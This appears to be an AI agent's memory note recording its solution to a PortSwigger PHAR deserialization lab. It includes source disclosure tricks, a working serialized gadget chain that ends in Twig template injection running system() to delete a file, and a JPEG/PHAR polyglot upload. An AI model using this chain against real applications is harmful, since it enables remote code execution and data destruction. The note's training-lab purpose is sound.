---
metadata:
  node_type: memory
name: "PHAR Deserialization Custom Gadget Chain Lab arm F"
description: "PHAR + custom gadget chain lab solved: /cgi-bin listing with .php~/PATH_INFO source read, avatar.php file_exists-before-filter phar trigger, phar_forge JPEG polyglot with CustomTemplate to Blog to Twig 1.19 chain."
last_updated: 2026-10-11T11:32:47+08:00
created: 2026-10-11T11:32:47+08:00
---

## 2026-09 — lab: Using PHAR deserialization to deploy a custom gadget chain (arm F, solved)

Target: PortSwigger academy blog app, instance reused:false.

Recon that mattered:
- `/cgi-bin` returns a **directory listing** exposing `CustomTemplate.php`, `Blog.php`, `avatar.php` (plus `.php~` backups).
- `/cgi-bin/<script>.php~` is served as `text/plain` → **raw source**. Same for PATH_INFO: `/cgi-bin/avatar.php/.`
  (trailing `/.` makes the handler treat it as a static path) → reads `avatar.php` source when no `.php~` exists.
- Account avatar is rendered as `/cgi-bin/avatar.php?avatar=<username>`; a 1x1 PNG was rejected as "Invalid avatar",
  a real ~270 KB JPEG was accepted.

Chain source (recovered, not guessed):
- `CustomTemplate` — private `$template_file_path`; `__destruct()` → `@unlink('templates/'.$this->template_file_path.'.lock')`
  (string concatenation of the property is the `__toString` trigger).
- `Blog` — `__wakeup()` builds `Twig_Environment` from `Twig_Loader_Array(['index' => $this->desc])`,
  `__toString()` → `$this->twig->render('index', ['user' => $this->user])` → Twig 1.19 SSTI.
- `avatar.php`: `chdir('../avatars/'); $avatar_file_path = $_GET['avatar'].'.jpg';
  if (file_exists($avatar_file_path)) { <filter for backslash, slash, dot> }` — **file_exists runs BEFORE the filter**,
  so a `phar://` value reaches the phar wrapper and unserializes metadata.

Payload: `/cgi-bin/avatar.php?avatar=phar:///home/carlos/avatars/wiener` (upload is stored as `<username>.jpg`).
Serialized metadata (224 bytes, verified with the `phpser` piece as a length oracle):
```
O:14:"CustomTemplate":1:{s:34:"%00CustomTemplate%00template_file_path";O:4:"Blog":2:{s:4:"user";N;
s:4:"desc";s:108:"{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";}}
```
Forged with the `phar_forge` piece: `--prefix <full real JPEG>` (polyglot passes image validation), `--sig sha1`.
Upload polyglot → trigger the `phar://` GET → `__destruct` → `Blog::__toString` → Twig render → `system()` → file deleted.

Tooling lesson: `phpser` doubles as a **byte-length oracle** for hand-written PHP serializations (data.bytes),
which makes private-property (`%00` name) length counts provable instead of hand-counted.

